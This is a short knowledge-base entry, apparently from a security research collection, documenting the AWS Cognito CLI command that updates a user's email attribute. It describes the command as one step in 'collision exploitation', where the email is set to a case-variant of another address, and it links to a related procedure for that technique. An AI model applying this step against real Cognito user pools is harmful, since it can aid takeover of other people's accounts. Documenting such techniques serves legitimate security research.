---
id: cmd-002
data: >-
  aws cognito-idp update-user-attributes --region us-east-1 --access-token
  eyJraWQ[...] (redacted token) --user-attributes
  Name=email,Value=flickr-Benign@lauritz-holtmann.de
tags:
  - cognito
  - update
  - manipulation
type: command
output: JSON with CodeDeliveryDetailsList indicating email delivery for verification
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:34.429Z'
verified: false
validated: true
submitted: true
---
# aws-cognito-update-user-attributes

## Command

```bash
aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...] (redacted token) --user-attributes Name=email,Value=flickr-Benign@lauritz-holtmann.de
```

## Description

Updates user attributes in AWS Cognito, such as email, using an access token. In this context, sets email to a case-variant for collision exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--region` | AWS region (us-east-1) | Yes |
| `--access-token` | Bearer token for auth | Yes |
| `--user-attributes` | Attributes to update, format Name=<attr>,Value=<value> | Yes |

## Examples

### Basic Usage

```bash
aws cognito-idp update-user-attributes --region us-east-1 --access-token <token> --user-attributes Name=email,Value=new@example.com
```

### Advanced Usage

```bash
aws cognito-idp update-user-attributes --region us-east-1 --access-token <token> --user-attributes Name=email,Value=variant@example.com Name=phone_number,Value=123456
```

## Expected Output

{"CodeDeliveryDetailsList": [{"AttributeName": "email", "DeliveryMedium": "EMAIL", "Destination": "new@example.com"}]}. Indicates verification sent but not enforced.

## Related

- [[commands/aws-cognito-get-user]]
- [[procedures/Update-Cognito-Email-to-Case-Variant]]
